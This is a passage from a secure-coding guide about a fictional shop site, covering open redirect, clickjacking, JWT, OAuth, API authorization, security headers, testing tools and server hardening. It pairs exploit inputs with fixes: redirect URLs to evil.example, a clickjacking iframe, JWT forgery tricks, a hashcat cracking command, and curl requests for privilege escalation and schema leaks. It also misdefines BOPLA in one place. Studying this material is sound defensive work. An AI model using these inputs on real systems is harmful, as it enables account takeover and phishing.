When the server deserializes `cart`, the gadget chain executes the shell command → reverse shell to `evil.example`.

**Mitigations:**
- Prefer structured data formats (JSON/Protobuf) with schemas.
- If you must deserialize: allowlist classes (`ObjectInputFilter` in Java), never accept serialized objects from clients (keep state server-side).
- Run the deserializing process in a sandbox with minimal privileges.
- Sign/integrity-check any serialized blob, and cryptographically bind it to the user.

### 3.8 Open Redirect

A URL parameter lets the attacker bounce victims to an attacker-controlled site — used to steal credentials (phishing) or OAuth codes.

```python
# login.py — VULNERABLE
@app.route("/login")
def login():
    return redirect(request.args.get("next", "/"))
```

Exploit:

```
https://shopfast.example/login?next=https://shopfast.example.evil.example/       # lookalike
https://shopfast.example/login?next=//evil.example/                               # protocol-relative
```

**Fix — allowlist redirect destinations:**

```python
ALLOWED = {"https://shopfast.example", "https://www.shopfast.example"}

@app.route("/login")
def login():
    nxt = request.args.get("next", "/")
    if nxt.startswith("/") and not nxt.startswith("//"):   # internal-only path
        return redirect(nxt)
    abort(400)
```

### 3.9 Clickjacking

Attacker overlays the victim site in an invisible iframe and tricks the user into clicking UI they can't see (e.g., "Enable camera", "Approve transfer").

```html
<iframe src="https://bankapp.example/settings" style="opacity:0; position:fixed; top:0; left:0; width:100%; height:100%"></iframe>
<button style="position:relative; z-index:1">Win a prize — click here!</button>
```

**Fix:** send `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` (§6). Both headers prevent the site from being framed.

### 3.10 Subdomain Takeover

A dangling CNAME record points to a decommissioned service that the attacker re-registers.

Scenario: `blog.shopfast.example` has a `CNAME blog.shopfast.example → shopfast-blog.ghost.io`. The Ghost site is deleted, but the CNAME remains. Attacker registers `shopfast-blog.ghost.io`, gains control of `blog.shopfast.example`, hosts phishing pages or steals cookies scoped to `.shopfast.example`.

**Fix:**
- Maintain an asset inventory and periodic DNS audit (search for dangling CNAME/A records).
- Remove DNS records when decommissioning services.
- Verify third-party subdomain providers respond before pointing CNAMEs at them.
- Use a DNS takeover scanner (e.g., `can-i-take-over-xyz`) in a weekly job.

---

## 4. Authentication & Session Security

### 4.1 Session Management & Cookie Flags

Sessions should be opaque tokens kept **server-side** (or in signed, encrypted client state with a very short lifetime). Cookies are the transport.

| Cookie attribute | Meaning | Recommendation |
|------------------|---------|----------------|
| `HttpOnly` | JS (`document.cookie`) cannot read the cookie | **Always** on session/auth cookies |
| `Secure` | Cookie only sent over HTTPS | **Always** |
| `SameSite` | Controls cross-site sending | `Lax` (default in modern browsers) or `Strict` for sessions; `None` only with `Secure` and specific need |
| `Domain` | Which domains receive the cookie | Never widen beyond your host; beware `.example.com` scope |
| `Path` | URL path scope | Restrict where possible |
| `Max-Age` / `Expires` | Lifetime | Sessions: 30–60 min idle timeout; keep refresh tokens short-lived |
| `__Host-` prefix | Requires `Secure`, `Path=/`, no `Domain` | Use for the most sensitive cookies |

Example secure session cookie:

```http
Set-Cookie: SESSIONID=8f3a9c02d14e8821e0b7f4a5c6d7e8f9; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800
```

Session hardening rules:
- Rotate the session ID on login and on privilege change.
- Invalidate sessions on password change, logout (client *and* server side).
- Timeout idle sessions; re-authenticate before sensitive actions.
- Store session data server-side (Redis/DB) with a short TTL; don't trust client data for authorization.
- Bind sessions loosely to device fingerprint (IP is too strict; but flag anomalous changes).

### 4.2 JWT (JSON Web Tokens)

JWT format: `header.payload.signature`, each part Base64URL-encoded.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzU3MTY2NDMwfQ.
s3cr3ts1g...signature
```

```json
// decoded header
{ "alg": "HS256", "typ": "JWT" }

// decoded payload
{ "sub": "1234567890", "name": "Alice", "role": "admin", "exp": 1757166430 }
```

#### JWT Vulnerabilities

**1. Algorithm confusion (`alg: HS256` with an RSA public key):**
The server verifies with the public key but the attacker signs with that same public key using HMAC. If the server lets the attacker choose the algorithm:

```json
{ "alg": "HS256" }
```
```python
# vuln.py
payload = jwt.decode(token, public_key_pem, algorithms=["HS256", "RS256"])
```
Attacker signs `{"role":"admin"}` using the *public* key as the HMAC secret → becomes admin.

**2. Weak/guessable secret:**
```bash
hashcat -m 16500 token.txt wordlist.txt   # cracks "iloveyou" in seconds
```
If the HS256 secret is weak, anyone forges tokens.

**3. `alg: none`:**
```json
{ "alg": "none", "typ": "JWT" }
```
If the library is configured to accept `none`, the attacker omits the signature entirely. Some libraries disable this by default; old versions didn't.

**4. No `exp` check / long-lived tokens:** Replayed stolen tokens work indefinitely.

#### JWT Best Practices

```python
import jwt
from datetime import timedelta, timezone, datetime

def issue_token(user_id, role):
    now = datetime.now(timezone.utc)
    return jwt.encode(
        {"sub": user_id, "role": role,
         "iat": now, "exp": now + timedelta(minutes=15),
         "iss": "https://auth.shopfast.example", "aud": "shopfast-api"},
        SECRET_OR_PRIVATE_KEY,
        algorithm="RS256",          # asymmetric; sign with private key
    )

def verify_token(token):
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=["RS256"],       # pin the algorithm explicitly
        issuer="https://auth.shopfast.example",
        audience="shopfast-api",
        options={"require_exp": True, "verify_exp": True},
    )
```

Additional: short access tokens (5–15 min) + refresh tokens; rotate signing keys; store tokens only in memory/secure storage (never `localStorage` — XSS reads it; prefer HttpOnly cookie); always pin `algorithms`; never trust `role`/`sub` from a token you can't verify and whose `iss`/`aud` you didn't check.

### 4.3 OAuth 2.0 & OIDC Overview

OAuth 2.0 is an **authorization** framework (delegated access). OpenID Connect (OIDC) builds identity on top (id tokens).

#### Core Roles & Flows

| Flow | Use case | How it works |
|------|----------|--------------|
| **Authorization Code** (+ PKCE) | Web apps & SPAs | User redirected to IdP, logs in, IdP redirects back with `code`; app exchanges code for tokens at token endpoint |
| **Client Credentials** | Server-to-server | App authenticates itself directly, no user involved |
| **Device Code** | TVs/CLIs | User enters code on another device |
| **Implicit** (deprecated) | Legacy SPAs | Token in redirect URL — avoid |

#### Authorization Code Flow with PKCE

```
1. SPA -> IdP:  GET /authorize?response_type=code&client_id=...&code_challenge=...&code_challenge_method=S256&state=...
2. IdP: user logs in & consents
3. IdP -> SPA: redirect to redirect_uri?code=AUTH_CODE&state=...
4. SPA -> IdP token endpoint: POST /token  code + code_verifier (client_secret optional for public clients)
5. IdP -> SPA: access_token + id_token (+ refresh_token)
6. SPA -> API: Authorization: Bearer <access_token>
```

**PKCE** (Proof Key for Code Exchange) protects public clients from authorization-code interception: the token exchange requires the `code_verifier` that only the SPA knows (derived from the `code_challenge`).

#### OAuth Security Checklist
- Use PKCE on all public clients; never log or store auth codes.
- Validate `state` to prevent CSRF on the redirect.
- Validate `redirect_uri` exactly against an allowlist — an open redirect here leaks codes.
- Validate `iss`, `aud`, `exp`, and `nonce` on id tokens.
- Never put access tokens in URLs.
- Use short-lived tokens + refresh with rotation.

### 4.4 MFA (Multi-Factor Authentication)

MFA combines at least two of: **something you know** (password), **something you have** (authenticator app, hardware key, SMS/OTP), **something you are** (biometrics).

Implementation notes:

- Prefer **TOTP** (RFC 6238) authenticator apps or **WebAuthn/FIDO2** hardware keys over SMS (SMS is vulnerable to SIM-swap).
- TOTP sample (Python, fictional library):

```python
import pyotp

# on enrollment:
secret = pyotp.random_base32()                    # store bound to user
otpauth = pyotp.totp.TOTP(secret).provisioning_uri("alice@shopfast.example", "ShopFast")

# on login:
totp = pyotp.TOTP(user.totp_secret)
if not totp.verify(otp_code, valid_window=1):
    abort(401)                                     # allow ±30s clock skew
```

- Make MFA **mandatory for admins and privileged actions** (password reset, fund transfers, role changes).
- Support **recovery codes** (one-time, hashed) and a safe account-recovery path.
- Don't allow bypass of MFA via alternate flows (e.g., "forgot password" resetting the MFA without re-auth).
- Phishing-resistant MFA (WebAuthn) defeats modern adversary-in-the-middle attacks.

### 4.5 Password Policy

Balanced, modern guidance (NIST SP 800-63B style):

| Policy item | Recommendation |
|-------------|----------------|
| Minimum length | 12+ characters |
| Maximum length | ≥ 128 (do NOT truncate silently; reject > some sane max) |
| Complexity | Don't require arcane complexity rules; prefer length + breach list screening |
| Breach screening | Reject passwords found in known breach dumps (check against a bloom filter / HaveIBeenPwned API) |
| Storage | Argon2id / bcrypt / scrypt (see §2.2) |
| Password managers | Encourage; support autocomplete `current-password` / `new-password` |
| Rotation | Don't force arbitrary rotation (causes weak passwords); rotate on compromise only |
| Reset flow | Email reset link with short-lived single-use token; invalidate old sessions after reset |

### 4.6 Account Lockout & Brute-Force Defense

Without lockout, attackers brute-force millions of combos. With naive lockout, attackers DoS legitimate users.

Modern approach — **progressive lockout + rate limiting:**

- Per-account: after 5 failed attempts, delay 5s; after 10, lock 15 min. Implement with a counter in Redis:

```python
def check_failures(username):
    key = f"lockout:{username}"
    count = redis.get(key) or 0
    if int(count) >= 10:
        ttl = redis.ttl(key)
        if ttl > 0:
            abort(429, f"Too many attempts. Try again in {ttl}s.")
```

- Per-IP/ASN rate limit on the login endpoint (e.g., 20/min/IP).
- **Do not** reveal *why* a login failed ("username not found" vs "bad password") — that enables user enumeration.
- Add honeypot fields and CAPTCHA after repeated failures.
- **Alert on** high-velocity login traffic (credential stuffing detection).
- Ensure the same protections apply to the **API** login, not just the web UI.

---

## 5. API Security

### 5.1 REST & GraphQL Security Fundamentals

**REST:**
- Use HTTPS everywhere; no secrets in URLs or query strings.
- Use proper HTTP verbs + status codes (never return 200 for auth failures).
- Never expose internal object IDs where a UUID suffices (reduces IDOR value).
- Paginate and bound resource sizes (DoS prevention).
- Reject unknown fields; validate types and lengths.

**GraphQL:**
- **Introspection** can leak the entire schema (`query { __schema { types { name fields { name } } } }`). Disable in production, or restrict to allowed roles.
- **Query depth/complexity limits:** a deep nested query can DoS the server:

```graphql
{
  user(id:1){ friends { friends { friends { friends { friends { id } } } } } }
}
```

- **Batching:** attackers can batch thousands of operations in one request. Limit batch size and cost.
- Use **persisted queries** + an allowlist where possible.

### 5.2 API Authentication Models

| Model | Best for | Notes |
|-------|----------|-------|
| API keys (opaque) | Server-to-server, low-risk internal | Store hashed server-side; scope & rotate; send in `X-Api-Key` header, never query string |
| JWT Bearer | Stateless distributed systems | §4.2 guidance applies; short TTL + refresh |
| OAuth2/OIDC | User-facing, delegated access | §4.3 guidance applies |
| mTLS | High-assurance B2B | Mutual cert auth between partners |

Example header usage:

```http
GET /api/v2/orders HTTP/1.1
Host: api.shopfast.example
X-Api-Key: sfk_live_9f3a...
```

API keys in the URL are logged everywhere:

```bash
# NEVER this:
curl "https://api.shopfast.example/v2/orders?api_key=sfk_live_9f3a"
```

### 5.3 Rate Limiting

Prevents brute-force, scraping, and DoS. Implement at gateway or app layer:

```python
# nginx-level (fragment)
limit_req_zone $binary_remote_addr zone=api:10m rate=20r/s;
limit_req zone=api burst=40 nodelay;

# app-level fallback (Flask/Redis)
@app.before_request
def rate_limit():
    key = f"rl:{request.remote_addr}:{request.path}"
    current = redis.incr(key)
    if current == 1:
        redis.expire(key, 60)
    if current > 60:
        abort(429, {"error": "rate limit exceeded"})
```

Return `429 Too Many Requests` with a `Retry-After` header. Apply **stricter** limits to login, password reset, and payment endpoints. Differentiate per authenticated user vs per IP. Add key-based (ID-based) limits for GraphQL cost.

### 5.4 Mass Assignment

Client-sent fields map directly onto object attributes, letting attackers set protected ones.

```python
# shop.py — VULNERABLE
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String)
    email = db.Column(db.String)
    is_admin = db.Column(db.Boolean, default=False)

@app.route("/api/users", methods=["POST"])
def create_user():
    user = User(**request.get_json())      # includes is_admin if attacker sends it!
    db.session.add(user); db.session.commit()
    return jsonify(user)
```

Exploit:

```bash
curl -X POST https://shopfast.example/api/users \
     -H "Content-Type: application/json" \
     -d '{"username":"mallory","email":"m@e.example","is_admin":true}'
```

Mallory is now admin.

**Fix:** explicit allowlists.

```python
@app.route("/api/users", methods=["POST"])
def create_user():
    data = request.get_json()
    user = User(
        username=data.get("username"),
        email=data.get("email"),
    )                                        # is_admin simply never read
```

Or with marshmallow/pydantic schemas that declare `load_only` fields and strip unknowns (`FORCE_JSON`/`extra="forbid"`).

### 5.5 BOLA / BOPLA (Broken Object / Function Level Authorization)

- **BOLA** (broken object-level authorization) = IDOR on APIs: any authenticated user can access objects by ID. Fix = ownership checks (see §2.1 example).
- **BOPLA** (broken function-level authorization) = any user can call admin-only functions because checks are only in the UI, not the API:

```python
# api.py — VULNERABLE
@app.route("/api/admin/users", methods=["GET"])
def admin_list_users():                       # no role check!
    return jsonify([u.to_dict() for u in User.query.all()])
```

```bash
curl -H "Authorization: Bearer <bob_token>" https://shopfast.example/api/admin/users
```

**Fix — enforce on every endpoint:**

```python
from functools import wraps

def require_role(role):
    def deco(fn):
        @wraps(fn)
        def wrapper(*a, **k):
            if g.current_user.role != role:
                abort(403)
            return fn(*a, **k)
        return wrapper
    return deco

@app.route("/api/admin/users", methods=["GET"])
@require_role("admin")
def admin_list_users():
    ...
```

Centralize authorization: use a middleware/decorator framework (e.g., Casbin, or framework-native `@roles_required`) and test every admin route.

### 5.6 API Enumeration & Abuse

- **User enumeration:** responses differ for "user not found" vs "bad password". Return identical generic responses.
- **ID enumeration:** sequential IDs reveal how many users/orders exist and enable bulk scraping. Use UUIDs.
- **Verb/parameter fuzzing:** attackers probe `GET/PUT/DELETE /api/users`, extra params, etc. Enforce allowlisted methods; return 405 for others; reject unknown JSON keys (`extra="forbid"`).

### 5.7 GraphQL Introspection Risk

```bash
curl -X POST https://graphql.shopfast.example/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

Returns the full schema — every field, mutation, and argument — a roadmap for the attacker. **Mitigations:** disable introspection in production (`graphql.engine` option), or gate it behind an admin role; implement query cost analysis + depth limits; persist and allowlist queries.

### 5.8 OWASP API Security Top 10 (summary)

| # | Risk |
|---|------|
| API1 | Broken Object Level Authorization (BOLA) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization (mass assignment) |
| API4 | Unrestricted Resource Consumption (rate limiting, pagination, cost) |
| API5 | Broken Function Level Authorization (BOPLA) |
| API6 | Unrestricted Access to Sensitive Business Flows (abuse of flows, e.g., coupon farms) |
| API7 | Server-Side Request Forgery (SSRF) |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management (old/rogue API versions still online) |
| API10 | Unsafe Consumption of APIs (trusting third-party APIs' data/redirects) |

---

## 6. Web Security Headers

### 6.1 Headers Reference Table

| Header | Purpose | Recommended value |
|--------|---------|-------------------|
| `Strict-Transport-Security` | Force HTTPS; prevents SSL-strip | `max-age=31536000; includeSubDomains; preload` |
| `Content-Security-Policy` | Restrict what content/browsers can load/execute | site-specific (below) |
| `X-Frame-Options` | Anti-clickjacking (legacy) | `DENY` (or `SAMEORIGIN` if you must frame) |
| `X-Content-Type-Options` | Prevent MIME-sniffing of responses | `nosniff` |
| `Referrer-Policy` | Control what URL info is sent on navigation | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Restrict browser features (camera, mic, geolocation) | `geolocation=(), camera=(), microphone=()` (deny all by default) |
| `Cross-Origin-Opener-Policy` | Isolate browsing context (Spectre hardening) | `same-origin` |
| `Cross-Origin-Resource-Policy` | Prevent other origins reading your resources | `same-site` or `same-origin` |

### 6.2 Content-Security-Policy Examples

**Strict production policy:**

```http
Content-Security-Policy: default-src 'self';
  script-src 'self' https://cdn.shopfast.example;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.shopfast.example;
  connect-src 'self' https://api.shopfast.example;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
```

**Purpose of each directive:**

| Directive | Blocks |
|-----------|--------|
| `default-src 'self'` | Baseline: only same-origin loads anything |
| `script-src` | Inline/remote JS (XSS killer) — no `unsafe-inline` |
| `object-src 'none'` | `<object>`, `<embed>` (flash-era RCE vectors) |
| `frame-ancestors 'none'` | Clickjacking (modern replacement for X-Frame-Options) |
| `base-uri 'self'` | `<base>` tag hijacking |
| `form-action 'self'` | Form submissions to third parties (CSRF/phishing) |

**If you use inline handlers or `eval`, you must refactor.** For SPA builds, generate hashes/nonces:

```http
Content-Security-Policy: script-src 'self' 'nonce-7B3a9c...' 'strict-dynamic'
```

with `<script nonce="7B3a9c...">` in the served HTML.

### 6.3 Mock Server Config (nginx)

```nginx
server {
    listen 443 ssl http2;
    server_name shopfast.example;

    # --- TLS hardening (see also §9.3) ---
    ssl_certificate     /etc/ssl/certs/shopfast.crt;
    ssl_certificate_key /etc/ssl/private/shopfast.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # --- Security headers ---
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), camera=(), microphone=(), payment=()" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;

    # --- Hide server banner ---
    server_tokens off;

    # --- No directory listing, restrict uploads ---
    autoindex off;

    location /media/ {
        alias /var/www/uploads/;
        add_header X-Content-Type-Options "nosniff" always;
        # never execute scripts in uploads
        location ~* \.(php|pl|py|jsp|sh|asp|cgi)$ { deny all; }
    }
}
```

Verify with a scanner: `curl -sI https://shopfast.example | grep -Ei 'security|csp|strict'` or use Mozilla Observatory / securityheaders.com.

---

## 7. Secure Coding Practices by Language

### 7.1 Python / Flask

**Input validation:** never trust `request.form`, `request.args`, or JSON bodies.

```python
import re
from marshmallow import Schema, fields, ValidationError

class RegisterSchema(Schema):
    username = fields.Str(required=True,
        validate=lambda v: re.fullmatch(r"[A-Za-z0-9_]{3,32}", v))
    email    = fields.Email(required=True)
    age      = fields.Int(validate=lambda v: 13 <= v <= 120)

data = RegisterSchema().load(request.get_json())   # raises 400 on bad data
```

**Output encoding:** rely on Jinja2 autoescaping (default on). Never mark user data `|safe`.

**Parameterized queries:** always placeholders (see §2.3).

**ORM pitfalls:** avoid raw `text()` blocks with `%` interpolation; beware **SQLAlchemy `text()` + format()**:

```python
# VULNERABLE — f-string into SQL
q = text(f"SELECT * FROM items WHERE sku = '{sku}'")
# SAFE
q = text("SELECT * FROM items WHERE sku = :sku").bindparams(sku=sku)
```

**Secrets:** use environment variables / vault; never commit. Detect with `trufflehog`/`detect-secrets`.

```python
import os
SECRET_KEY = os.environ["SHOPFAST_SECRET_KEY"]   # NOT a literal
```

**Dependency scanning:** `pip-audit`, `safety`, OWASP Dependency-Check in CI.

### 7.2 Node.js / Express

```javascript
// never trust input, always validate
const { celebrate, Joi } = require('celebrate');

router.post('/login',
  celebrate({ body: Joi.object({
    username: Joi.string().alphanum().min(3).max(32).required(),
    password: Joi.string().min(12).max(128).required(),
  })}),
  handler);
```

**NoSQL injection pitfall:**

```javascript
// VULNERABLE — object injection into MongoDB query
const user = await users.findOne({ username: req.body.username, password: req.body.password });

// exploit: username = { "$ne": null }
```

Validate types (string) so operators can't be injected; or use a schema library that whitelists.

**Prototype pollution:** avoid deep-merge of untrusted objects; use `Object.assign`/spread with allowlists; `JSON.parse` with `__proto__` keys → sanitize.

**Sinks to escape:** `innerHTML`, `document.write`, `eval`, `child_process.exec` (prefer `execFile` with argv arrays), `path.join` with traversal checks.

**Dependencies:** `npm audit` in CI, `package-lock.json` committed, `overrides` for known-vulnerable transitive deps, `npm pkg set scripts.preinstall="node ./no-install.js"` anti-supply-chain guard.

### 7.3 Java / Spring

- **SQL:** always JPA/Criteria or `?` placeholders with `JdbcTemplate`; never string-concat SQL.
- **Deserialization:** restrict `ObjectInputFilter`; avoid Java native serialization for client input.
- **Spring Security:** default deny; configure:

```java
http
  .csrf().and()
  .sessionManagement()
      .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
  .authorizeHttpRequests(auth -> auth
      .requestMatchers("/api/admin/**").hasRole("ADMIN")
      .anyRequest().authenticated());
```

- **Prevent mass assignment** by using DTOs, not entities, in `@RequestBody`.
- **XXE:** set `disallow-doctype-decl` on any `DocumentBuilderFactory`.
- **Expression injection:** never pass user input into SpEL / OGNL (`@Value` from untrusted source is dangerous).
- **Dependency scanning:** OWASP Dependency-Check Maven/Gradle plugin; fail on criticals.

### 7.4 PHP

- **Output encoding:** `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')` at every output point (or use a template engine with autoescape, e.g., Twig).
- **SQL:** PDO prepared statements with emulation off:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$email]);
```

- **Deserialization:** avoid `unserialize()` on untrusted input; use `json_decode` with validation.
- **File uploads:** verify with `finfo` magic bytes; store outside webroot; never trust `$_FILES['x']['name']`.
- **`error_reporting`: off in prod, log to file; never display `display_errors`.
- **Headers:** set via `header()` or web server config; ensure session cookie flags: `session.cookie_httponly=1`, `session.cookie_secure=1`, `session.use_strict_mode=1`.

### 7.5 Cross-Language Fundamentals

| Concern | Rule |
|---------|------|
| Input validation | Validate server-side always; client-side is UX only |
| Output encoding | Encode in the correct context (HTML/attr/JS/URL/CSS) |
| SQL | Parameterize everything, always |
| ORM | Avoid raw string SQL; use typed bind params |
| Secrets | Vault/env at runtime; never hardcode; rotate; scan for leaks |
| Dependencies | Lockfiles + hashes + SCA in CI + patch SLA |
| Error handling | Generic messages to clients; details to logs (no secrets) |
| Files | Magic-byte + extension allowlist; opaque names; outside webroot |
| Crypto | Use vetted libraries, correct primitives (§2.2) |

---

## 8. Static & Dynamic Testing

### 8.1 SAST — Static Application Security Testing

Scans source code *without executing* it. Catches injection patterns, secrets, unsafe deserialization.

**semgrep example finding:**

```yaml
# rules/sql-injection.yaml
rules:
  - id: flask-sqli-f-string
    patterns:
      - pattern-either:
          - pattern: db.execute(f"...")
          - pattern: cursor.execute(f"...")
    message: Potential SQL injection — use parameterized queries
    severity: ERROR
    languages: [python]
```

```bash
semgrep --config rules/ --output findings.sarif .
```

Mock finding output:

```
rules.flask-sqli-f-string
    Severity: ERROR
    File: src/auth.py:14
    Code:  db.execute(f"SELECT * FROM users WHERE username='{username}'")
    Fix:   db.execute("SELECT * FROM users WHERE username=?", (username,))
```

**bandit (Python):**

```bash
bandit -r src/ -f json -o bandit.json
```

Mock finding:

```
Issue: [B105:hardcoded_password_string] Possible password hardcoded
Location: src/config.py:22
	SECRET_KEY = "hunter2-super-secret"
```

**SonarQube:** central quality + security server; gates build on new critical issues; supports 30+ languages.

### 8.2 DAST — Dynamic Application Security Testing

Black-box scanning of a *running* app. Burp Suite, OWASP ZAP, Acunetix.

**OWASP ZAP baseline scan:**

```bash
zap-baseline.py -t https://staging.shopfast.example -r report.html
```

Mock report excerpt:

| Alert | Risk | URL |
|-------|------|-----|
| SQL Injection (SQLite) | High | `/search?q=...` |
| Absence of Anti-CSRF Tokens | Medium | `/transfer` |
| X-Frame-Options Header Not Set | Medium | `/` |
| Cookie without HttpOnly | Low | `/login` |

DAST is best in **staging** (it will break things) and after major changes.

### 8.3 IAST & RASP

| Tool type | Full name | What it does |
|-----------|-----------|--------------|
| **IAST** | Interactive AST | Instrumented app observes requests *during* functional testing; correlates input → tainted sink in real time (e.g., Contrast, Veracode DAST-IAST) |
| **RASP** | Runtime App Self-Protection | Sits *inside* the runtime and blocks attacks at execution time (e.g., detection of tainted SQL reaching the DB) — last line of defense |

IAST gives low false positives (it sees real data flow); RASP protects in production but is not a replacement for fixing code.

### 8.4 Fuzzing Web Apps

Send malformed/semi-random input to find crashes, panics, parser bugs.

```bash
# ffuf content discovery
ffuf -w /tmp/wordlist.txt -u https://shopfast.example/FUZZ -mc 200,301,401
# radamsa mutation fuzzing of an HTTP upload endpoint
radamsa /tmp/seed.json | curl -X POST --data-binary @- https://api.shopfast.example/v1/import -o /dev/null
```

Integrate API fuzzers (RESTler, schemathesis) that generate requests from OpenAPI schemas and flag 500s/panics.

### 8.5 SCA — Software Composition Analysis

Vulnerability scanning of dependencies:

```bash
# Python
pip-audit -r requirements.txt
# Node
npm audit --json
# Generic / CI
dependency-check --project ShopFast --scan ./target --format SARIF --out ./sca/
```

Mock finding:

```
Name: fast-jsonp   Version: 1.0.3   Severity: CRITICAL   CVE-2024-8821
Description: Prototype pollution leading to RCE
Fix: upgrade to >= 2.1.0
```

Automate in CI, fail on high/critical, and generate an SBOM (CycloneDX/SPDX) each release.

---

## 9. WAF & Web Server Hardening

### 9.1 ModSecurity + OWASP CRS

ModSecurity is an open-source WAF engine; OWASP Core Rule Set (CRS) provides generic attack detection rules.

```
# modsecurity.conf (fragment)
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess Off
SecAuditEngine RelevantOnly
SecAuditLog /var/log/modsec_audit.log

Include /etc/modsecurity/crs/crs-setup.conf
Include /etc/modsecurity/crs/rules/*.conf
```

OWASP CRS rule families (fictional rule numbers):

| Rule | What it blocks |
|------|----------------|
| 942xxx | SQL Injection |
| 941xxx | XSS |
| 930xxx | Path Traversal (`../`) |
| 933xxx | PHP Injection |
| 913xxx | Scanner Detection (sqlmap, nikto) |
| 920xxx | Protocol/Request anomalies |

Mock triggered rule log:

```
Message: Warning. Pattern match "union.*select" at ARGS:q. [file "REQUEST-942-SQLI.conf"] [rule "942100"]
Message: Access denied with code 403 (phase 2).
```

**Tuning:** run in **DetectionOnly** mode first to eliminate false positives, then enable blocking with exclusions for known-safe paths.

### 9.2 nginx Hardening

```nginx
# /etc/nginx/nginx.conf (fragment)
user nginx;
worker_processes auto;

http {
    server_tokens off;                      # hide version
    autoindex off;                          # no directory listing

    client_max_body_size 10m;               # bound uploads
    add_header X-Content-Type-Options nosniff always;

    # limit request rates
    limit_req_zone $binary_remote_addr zone=general:10m rate=30r/s;

    server {
        listen 443 ssl http2;
        location /api/ { limit_req zone=api burst=60 nodelay; proxy_pass http://backend; }
        # deny access to dotfiles
        location ~ /\. { deny all; }
    }
}
```

### 9.3 Apache Hardening

```apache
# /etc/apache2/conf-available/security.conf
ServerTokens Prod
ServerSignature Off
Options -Indexes -FollowSymLinks
TraceEnable Off

<Directory /var/www/html>
    AllowOverride None
    Require all granted
    <LimitExcept GET POST HEAD>
        Require all denied
    </LimitExcept>
</Directory>

# block dotfiles
<FilesMatch "^\.">
    Require all denied
</FilesMatch>
```

### 9.4 TLS Configuration

- **Protocols:** TLS 1.2 and 1.3 only (drop 1.0/1.1 — CVE-2011-3389 BEAST, POODLE-era).
- **Ciphers:** AEAD suites only (GCM/ChaCha20); disable RC4, 3DES, CBC.
- **Certificates:** valid, from trusted CA, with full chain; automate renewal (Let's Encrypt / cert-manager).
- Test with: `sslscan`, `testssl.sh`, `ssllabs.com`.

### 9.5 Files, Permissions, and Headers

| Item | Hardening |
|------|-----------|
| Web root permissions | `chown -R root:www-data`; files 644, dirs 755; never 777 |
| Uploads | Outside webroot; no execute bit |
| Config files | `chmod 640`, owned by root, not web user |
| `robots.txt` | Don't rely on it for security (it's public); do hide truly sensitive paths anyway with auth |
| Server headers | `server_tokens off` / `ServerTokens Prod`; strip `X-Powered-By` |
| Error pages | Custom generic 403/404/500 pages (no versions/stack traces) |
| Backups | Not web-accessible; test restore; encrypted at rest |
| Default pages | Remove default index/deploy pages and sample apps |

---

## 10. Mobile App Security Basics

### 10.1 OWASP Mobile Top 10 (summary)

| # | Risk |
|---|------|
| M1 | Improper Credential Usage (hardcoded creds, keys, tokens) |
| M2 | Inadequate Supply Chain Security (vulnerable/injected libs) |
| M3 | Insecure Authentication / Authorization (weak client-side auth) |
| M4 | Insufficient Input/Output Validation |
| M5 | Insecure Communication (cleartext traffic, no pinning) |
| M6 | Inadequate Privacy Controls (excessive data collection) |
| M7 | Insufficient Binary Protections (easy to reverse/decompile) |
| M8 | Security Misconfiguration (permissions, exported components) |
| M9 | Insecure Data Storage (sensitive data in plaintext files) |
| M10 | Insufficient Cryptography (weak/improper crypto use) |

### 10.2 App Hardening

- **Never trust the client.** Business rules, pricing, and authorization live server-side.
- **Insecure data storage:** don't store PII/tokens in `SharedPreferences`/`NSUserDefaults` plaintext. Use Keystore/Keychain-backed encrypted storage.
- **Android:** minimize permissions; don't export Activities/Services/BroadcastReceivers unless needed; check manifest for `allowBackup=true` (leaks data via ADB backup).
- **iOS:** guard against Keychain item accessibility `kSecAttrAccessibleWhenUnlocked` for tokens; disable debugger when possible.
- **Reverse-engineering:** obfuscation (ProGuard/R8 for Android, stripping/symbol obfuscation for iOS) raises the bar — it is not a security boundary.
- **Rooting/jailbreak:** detect but don't hard-fail; combine with server-side risk signals.
- **Update** dependencies (native libs + JS bundles) — mobile supply chain is a top risk (M2).

### 10.3 API Security for Mobile

- Auth via **OIDC code flow + PKCE** with tokens in Keychain/Keystore; short-lived access tokens + rotating refresh tokens.
- **Certificate pinning** (M5): pin your API's CA or leaf public key so MITM proxies can't inspect traffic:

```kotlin
// Android — OkHttp (fictional, illustrative)
val pinner = CertificatePinner.Builder()
    .add("api.shopfast.example",
         "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=") // public key pin
    .build()
```

